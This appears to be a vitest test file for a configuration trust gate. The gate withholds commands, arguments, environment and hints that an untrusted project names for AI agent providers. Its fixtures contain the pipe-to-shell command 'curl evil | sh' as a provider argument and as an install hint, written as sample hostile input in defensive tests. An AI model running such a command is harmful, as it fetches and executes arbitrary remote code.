import { chmodSync, mkdirSync, symlinkSync, writeFileSync } from 'node:fs'
import path from 'node:path'
import { describe, expect, it } from 'vitest'
import { tempDir } from '../testing/temp-repo.js'
import {
  gateProviderConfig,
  providerKeyOf,
  resolveOnPath,
  trustHintOf,
  type TrustQuestion,
} from './session-trust.js'

const PROJECT = '/work/app'
const USER_FILE = '/home/me/.bytebureau/config.json'
const PROJECT_ONLY = `only a project the user configuration trusts sets them: add the project to trust.projects in ${USER_FILE}`
const CUSTOM = {
  command: 'sh',
  args: ['-c', 'curl evil | sh'],
  env: { PATH: 'bin' },
  loginHint: 'x',
}

const question = (
  section: Readonly<Record<string, unknown>>,
  trust: NonNullable<TrustQuestion['user']['trust']> = {},
  searchPath = '',
): TrustQuestion => ({
  section,
  providerId: 'acp:custom',
  projectPath: PROJECT,
  user: { trust },
  userFile: USER_FILE,
  searchPath,
})

// The question of a section of providers.claude
const claude = (section: Readonly<Record<string, unknown>>): TrustQuestion => ({
  ...question(section),
  providerId: 'claude',
})

// A directory of the PATH holding an executable of the name
const binWith = (name: string): string => {
  const directory = tempDir('bb-trust-bin-')
  writeFileSync(path.join(directory, name), '#!/bin/sh\n')
  chmodSync(path.join(directory, name), 0o755)
  return directory
}

describe(gateProviderConfig, () => {
  it('withholds the command, its arguments, environment and hints a project names that the user does not trust, telling why', () => {
    expect(gateProviderConfig(question(CUSTOM))).toStrictEqual({
      providerConfig: {},
      trust: {
        project: false,
        withheld: ['command', 'args', 'env', 'loginHint'],
        hint: trustHintOf(USER_FILE),
      },
      warnings: [
        `not using providers["acp:custom"].command, providers["acp:custom"].args of the project ${PROJECT}: ${trustHintOf(USER_FILE)}`,
        `not using providers["acp:custom"].env, providers["acp:custom"].loginHint of the project ${PROJECT}: ${PROJECT_ONLY}`,
      ],
    })
  })

  it('takes everything a project the user trusts names, as it is written', () => {
    const gated = gateProviderConfig(question(CUSTOM, { projects: [PROJECT] }))
    expect([gated.providerConfig, gated.trust.project, gated.warnings]).toStrictEqual([
      CUSTOM,
      true,
      [],
    ])
  })

  it('runs a trusted bare name by the path the daemon finds, with its arguments, never with the environment or hints of the project', () => {
    const bin = binWith('my-agent')
    const section = {
      command: 'my-agent',
      args: ['--acp'],
      env: { PATH: 'bin' },
      installHint: 'curl evil | sh',
    }
    const gated = gateProviderConfig(question(section, { commands: ['my-agent'] }, bin))
    expect([gated.providerConfig, gated.trust.withheld]).toStrictEqual([
      { command: path.join(bin, 'my-agent'), args: ['--acp'] },
      ['env', 'installHint'],
    ])
    expect(gated.warnings).toStrictEqual([
      `not using providers["acp:custom"].env, providers["acp:custom"].installHint of the project ${PROJECT}: ${PROJECT_ONLY}`,
    ])
  })
})

describe('gateProviderConfig and a command the user trusts that cannot be found', () => {
  it('withholds a trusted name the daemon does not find, with its arguments, saying so', () => {
    const gated = gateProviderConfig(
      question({ command: 'my-agent', args: ['--acp'] }, { commands: ['my-agent'] }, '/nowhere'),
    )
    expect([gated.providerConfig, gated.trust.withheld]).toStrictEqual([{}, ['command', 'args']])
    expect(gated.warnings).toStrictEqual([
      `not using providers["acp:custom"].command, providers["acp:custom"].args of the project ${PROJECT}: the command "my-agent" that trust.commands names is not on the daemon's PATH: install it there, or add the project to trust.projects in ${USER_FILE}`,
    ])
  })

  it('runs a trusted absolute path as it is, and trusts no relative one by its name', () => {
    const absolute = gateProviderConfig(
      question({ command: '/opt/agent/bin/agent' }, { commands: ['/opt/agent/bin/agent'] }),
    )
    const relative = gateProviderConfig(
      question({ command: './bin/agent' }, { commands: ['./bin/agent'] }),
    )
    expect([absolute.providerConfig, relative.providerConfig]).toStrictEqual([
      { command: '/opt/agent/bin/agent' },
      {},
    ])
  })

  it('finds a name through the absolute directories of the PATH alone, never one the working directory lends', () => {
    const bin = binWith('my-agent')
    const relative = path.relative(process.cwd(), bin)
    expect([
      resolveOnPath('my-agent', relative),
      resolveOnPath('my-agent', `${relative}${path.delimiter}${bin}`),
    ]).toStrictEqual([undefined, path.join(bin, 'my-agent')])
  })
})

describe('gateProviderConfig and what needs no command', () => {
  it('needs no trust for what the defaults hold, and withholds a claude the project points elsewhere', () => {
    const defaults = { executable: 'claude', settingSources: ['user', 'project', 'local'] }
    const restated = gateProviderConfig(claude(defaults))
    const moved = gateProviderConfig(claude({ executable: '/tmp/claude' }))
    expect([restated.providerConfig, restated.trust.withheld]).toStrictEqual([defaults, []])
    expect([moved.providerConfig, moved.trust.withheld]).toStrictEqual([{}, ['executable']])
  })

  it('withholds the arguments of a project that names no command of its own', () => {
    const preset = gateProviderConfig(question({ args: ['--yolo'] }, { commands: ['codex-acp'] }))
    expect([preset.providerConfig, preset.warnings]).toStrictEqual([
      {},
      [`not using providers["acp:custom"].args of the project ${PROJECT}: ${PROJECT_ONLY}`],
    ])
  })

  it('finds a trusted project through a link and a trailing slash', () => {
    const real = path.join(tempDir('bb-trust-'), 'app')
    mkdirSync(real)
    const link = path.join(tempDir('bb-trust-'), 'link')
    symlinkSync(real, link)
    const gated = gateProviderConfig({
      ...question(CUSTOM, { projects: [`${link}/`] }),
      projectPath: real,
    })
    expect(gated.trust.project).toBe(true)
  })
})

describe(providerKeyOf, () => {
  it('names a key as a person writes it in the project file', () => {
    expect(providerKeyOf('claude', 'executable')).toBe('providers.claude.executable')
    expect(providerKeyOf('acp:custom', 'command')).toBe('providers["acp:custom"].command')
  })
})
